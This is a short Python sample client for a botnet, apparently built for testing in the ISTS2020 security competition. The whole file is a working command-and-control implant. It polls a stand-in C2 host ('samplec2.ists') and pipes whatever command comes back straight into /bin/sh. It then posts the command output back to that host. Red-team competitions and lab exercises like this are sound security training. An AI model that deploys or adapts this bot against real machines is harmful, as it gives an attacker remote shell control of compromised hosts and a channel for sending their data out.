"""
A sample python client which implements the bot for testing
https://github.com/ritsec/ISTS2020-Botnet/blob/master/bot.py
"""

import os
import requests
import json
import subprocess

def jprint(data):
    string = json.dumps(data, indent=2)
    string = "\t" + string.replace("\n", "\n\t") + "\n"
    print(string)

def main():
    server = "samplec2.ists"
    ip = "10.2.0.0"
    team = "5"

    print("[*] GET to {}/callback:".format(server))
    # Get the commands from the server
    data = {
        "team": team,
        "ip": ip,
        "user": "www-data"
    }
    jprint(data)
    resp = requests.get(server + "/callback", json=data).json()
    print("[+] Response:")
    jprint(resp)

    if "printf" in resp['command']:
        print(resp['command'])
    if "error" in resp:
        print("[!]", resp["error"])
        quit(1)

    # Run the commands
    print("[*] Running the process...")
    try:
        proc = subprocess.Popen(
            "/bin/sh", stdin=subprocess.PIPE, stdout=subprocess.PIPE
        )
        stdout, stderr = proc.communicate(resp['command'].encode("utf-8"))
        proc.terminate()
    except Exception as E:
        print("[!] Failure:", E)
        quit(1)

    # Send the results back to the same URL but as a POST
    print("[*] POST to {}/callback:".format(server))


    data = {
        "id": resp['id'],
        "results": stdout.decode("utf-8")
    }
    jprint(data)

    resp = requests.post(server + "/callback", json=data).json()
    print("[+] Response:")
    jprint(resp)


if __name__ == "__main__":
    main()